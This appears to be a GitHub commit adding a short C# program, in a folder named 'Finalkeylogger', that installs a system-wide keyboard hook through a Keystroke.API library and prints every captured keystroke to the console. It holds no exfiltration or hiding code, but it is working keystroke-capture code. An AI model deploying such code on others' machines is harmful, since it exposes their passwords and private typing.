f02256d26adc88ad3d0a6718445c1d714df44a34
kgayed <89406007+kgayed@users.noreply.github.com>
2022-12-11 07:38:10 -0500

    Add files via upload

---
+++ Finalkeylogger/Program.cs
@@ -0,0 +1,18 @@
+﻿using Keystroke.API;
+using System;
+using System.Windows.Forms;
+
+namespace ConsoleApplicationTest
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			using (var api = new KeystrokeAPI())
+			{
+				api.CreateKeyboardHook((character) => { Console.Write(character); });
+				Application.Run();
+			}
+		}
+	}
+}
